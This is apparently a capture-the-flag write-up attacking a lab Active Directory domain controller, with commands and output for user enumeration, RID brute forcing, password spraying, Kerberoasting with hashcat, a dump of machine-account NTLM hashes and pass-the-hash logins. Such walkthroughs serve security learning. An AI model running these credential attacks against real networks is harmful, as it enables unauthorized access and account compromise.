---
tags:
  - Active_Directory
---

## Enumeration
We will start with nmap:
```sh
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-10-20 16:18:23Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?      syn-ack ttl 125
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-10-20T16:20:01+00:00; -3h00m05s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Issuer: commonName=DC01.SOUPEDECODE.LOCAL

```

User enumeration:
```sh
kerbrute userenum -d SOUPEDECODE.LOCAL --dc DC01.SOUPEDECODE.LOCAL /snap/seclists/current/Usernames/xato-net-10-million-usernames-dup.txt -o valid_ad_users

2025/10/20 20:34:44 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2025/10/20 20:34:48 >  [+] VALID USERNAME:       admin@SOUPEDECODE.LOCAL
2025/10/20 20:35:54 >  [+] VALID USERNAME:       guest@SOUPEDECODE.LOCAL
2025/10/20 20:36:01 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2025/10/20 20:38:19 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2025/10/20 20:38:48 >  [+] VALID USERNAME:       Admin@SOUPEDECODE.LOCAL

```

Try to list shares using `guest`:
```sh
nxc smb 10.10.180.100 -u 'guest' -p '' -d SOUPEDECODE.LOCAL  --no-bruteforce
SMB         10.10.180.100   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.180.100   445    DC01             [+] SOUPEDECODE.LOCAL\guest:
SMB         10.10.180.100   445    DC01             Share           Permissions     Remark
SMB         10.10.180.100   445    DC01             -----           -----------     ------
SMB         10.10.180.100   445    DC01             ADMIN$                          Remote Admin
SMB         10.10.180.100   445    DC01             backup
SMB         10.10.180.100   445    DC01             C$                              Default share
SMB         10.10.180.100   445    DC01             IPC$            READ            Remote IPC
SMB         10.10.180.100   445    DC01             NETLOGON                        Logon server share
SMB         10.10.180.100   445    DC01             SYSVOL                          Logon server share
SMB         10.10.180.100   445    DC01             Users
```

Since you have read on `IPC$` you can do rid brute forceing:
```sh
nxc smb SOUPEDECODE.LOCAL -u 'guest' --rid-brute
grep 'SOUPEDECODE\\' rid_brute.txt | cut -d':' -f2- | sed -E 's/.*SOUPEDECODE\\(.*) \(SidType.*/\1/' | grep -v '\$' > usernames.txt
```

Now you can use this wordlist for `kerberosing` and `ASRepRoasting` and you can try enumrate users that have the same username and password:
```sh
nxc smb soupdecode.local -u usernames.txt -p usernames.txt --no-brute --continue-on-success

SMB         10.10.255.202   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB         10.10.255.202   445    DC01             [-] SOUPEDECODE.LOCAL\file_svc:file_svc STATUS_LOGON_FAILURE
SMB         10.10.255.202   445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE
```

We found we login in SMB using `ybob317` : `ybob317`:
```sh
nxc smb SOUPEDECODE.LOCAL -u 'ybob317' -p 'ybob317' --shares
SMB         10.10.255.202   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.255.202   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB         10.10.255.202   445    DC01             [*] Enumerated shares
SMB         10.10.255.202   445    DC01             Share           Permissions     Remark
SMB         10.10.255.202   445    DC01             -----           -----------     ------
SMB         10.10.255.202   445    DC01             ADMIN$                          Remote Admin
SMB         10.10.255.202   445    DC01             backup
SMB         10.10.255.202   445    DC01             C$                              Default share
SMB         10.10.255.202   445    DC01             IPC$            READ            Remote IPC
SMB         10.10.255.202   445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.255.202   445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.255.202   445    DC01             Users           READ

```

Connect:
```sh
smbclient '\\SOUPEDECODE.LOCAL\users' -U 'ybob317' -t 120
# nothing is too interesting in shares
```

Try do some kerberosing:
```sh
nxc ldap "$DC" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"  -k  --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt -a 0 /opt/lists/rockyou.txt
```

We found we got creds-->>  `file_svc` :`Password123!!`

found file in shares contain hashes:
```
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

doing user:password checks.
```sh
nxc smb "$DC" -u hash_user.txt -H "hashes.txt" -d "$DOMAIN"  --no-bruteforce --continue
SMB         10.10.61.191    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.61.191    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.61.191    445    DC01             [-] soupedecode.local\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
SMB         10.10.61.191    445    DC01             [-] soupedecode.local\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
SMB         10.10.61.191    445    DC01             [+] soupedecode.local\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
SMB         10.10.61.191    445    DC01             [-] Connection Error: Error occurs while reading from remote(104)
SMB         10.10.61.191    445    DC01             [-] soupedecode.local\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE
SMB         10.10.61.191    445    DC01             [-] soupedecode.local\ApplicationServer$:8cd90ac6cba6dde9d8038b068c17e9f5 STATUS_LOGON_FAILURE
SMB         10.10.61.191    445    DC01             [-] soupedecode.local\PrintServer$:b8a38c432ac59ed00b2a373f4f050d28 STATUS_LOGON_FAILURE
SMB         10.10.61.191    445    DC01             [-] soupedecode.local\ProxyServer$:4e3f0bb3e5b6e3e662611b1a87988881 STATUS_LOGON_FAILURE
SMB         10.10.61.191    445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
```

`FileServer$:e41da7e79a4c76dbd9cf79d1cb325559`

getting root.txt
```sh
smbclient.py  "$DOMAIN"/"$USER"@"$DC" -k -no-pass -target-ip "$IP"
```